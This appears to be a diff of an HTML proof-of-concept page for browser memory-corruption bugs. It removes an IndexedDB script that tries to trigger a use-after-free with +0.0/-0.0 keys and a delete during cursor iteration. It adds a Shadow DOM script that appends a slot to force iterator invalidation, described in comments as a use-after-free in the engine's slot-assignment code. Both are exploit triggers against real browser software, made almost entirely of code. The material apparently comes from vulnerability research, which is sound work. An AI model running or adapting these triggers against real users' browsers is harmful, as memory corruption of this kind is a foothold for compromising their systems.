@@ -11,64 +11,45 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== INDEXEDDB HASH COLLISION USE-AFTER-FREE (V2) ===", "info");
-log("[*] Opening database and setting up the trap...", "info");
+log("=== SLOTASSIGNMENT ITERATOR INVALIDATION ===", "info");
+log("[*] Building the Shadow DOM trap...", "info");
 
-let request = indexedDB.open("UAF_DB_V2_" + Date.now(), 1);
+let host = document.createElement('div');
+document.body.appendChild(host);
+let shadow = host.attachShadow({ mode: 'open' });
 
-request.onupgradeneeded = (e) => {
-    let db = e.target.result;
-    let store = db.createObjectStore("store", { keyPath: "id" });
-    store.createIndex("idx", "value");
-    log("[*] Database created with index 'idx'", "info");
-};
+// We need an initial slot and an assigned node to set up the state
+let slot1 = document.createElement('slot');
+slot1.name = 'slot_a';
+shadow.appendChild(slot1);
 
-request.onsuccess = (e) => {
-    let db = e.target.result;
-    log("[*] Database opened. Starting transaction...", "info");
+let child = document.createElement('span');
+child.slot = 'slot_a';
+host.appendChild(child);
+
+log("[*] Initial state set. Now we force a mutation...", "info");
+
+setTimeout(() => {
+    log("[!] Triggering resolveSlotsAfterSlotMutation!", "warn");
+    log("[!] The C++ code will start iterating over m_slots...", "warn");
     
-    let tx = db.transaction("store", "readwrite");
-    let store = tx.objectStore("store");
-
-    log("[!] Inserting +0.0 and -0.0...", "warn");
-    store.put({ id: 1, value: 0.0 });
-    store.put({ id: 2, value: -0.0 });
-
-    tx.oncomplete = () => {
-        log("[*] Insertion complete. Now we break the HashMap...", "info");
-        
-        let tx2 = db.transaction("store", "readwrite");
-        let store2 = tx2.objectStore("store");
-        let index = store2.index("idx");
-
-        let cursorReq = index.openCursor();
-        let firstCursor = true;
-
-        cursorReq.onsuccess = (event) => {
-            let cursor = event.target.result;
-            if (cursor && firstCursor) {
-                firstCursor = false;
-                log("[!] Cursor opened. Holding reference to the record...", "warn");
-                
-                log("[!] Deleting +0.0 to corrupt the map...", "hit");
-                // DO NOT USE SETTIMEOUT! Keep the transaction active!
-                let delReq = store2.delete(1); 
-                
-                delReq.onsuccess = () => {
-                    log("[*] Delete processed! The map is corrupted!", "warn");
-                    log("[*] Advancing cursor over FREED MEMORY...", "hit");
-                    try {
-                        cursor.continue();
-                    } catch(e) {
-                        log("[-] Error: " + e.message, "info");
-                    }
-                };
-            } else if (cursor) {
-                log("[-] Cursor advanced successfully (No crash? Maybe the allocator got lucky)", "info");
-            }
-        };
-    };
-};
+    // Adding a new slot triggers resolveSlotsAfterSlotMutation.
+    // While iterating, it calls hasAssignedNodes(), which calls assignSlots().
+    // assignSlots() MUTATES the m_slots map while it is being iterated!
+    // Result: Iterator invalidation -> Use-After-Free!
+    
+    let slot2 = document.createElement('slot');
+    slot2.name = 'slot_b';
+    
+    log("[*] Appending the second slot. Brace for impact...", "hit");
+    
+    try {
+        shadow.appendChild(slot2);
+        log("[-] If you see this, it survived (or the allocator masked the corruption).", "info");
+    } catch(e) {
+        log("[-] Error: " + e.message, "info");
+    }
+}, 500);
 </script>
 </body>
 </html>
